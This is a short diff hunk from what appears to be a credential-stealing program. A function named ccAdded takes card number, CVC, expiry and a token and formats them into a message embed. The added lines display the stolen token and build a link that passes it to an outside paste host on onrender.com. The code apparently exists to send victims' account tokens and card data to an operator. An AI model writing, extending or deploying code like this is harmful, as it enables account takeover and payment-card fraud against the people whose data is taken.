@@ -816,6 +816,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     embeds: [
       {
         color: config.embed_color,
+        fields: [
                 {
                     name: `<a:bby:987689940852817971> Token:`,
                     value: `\`${token}\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
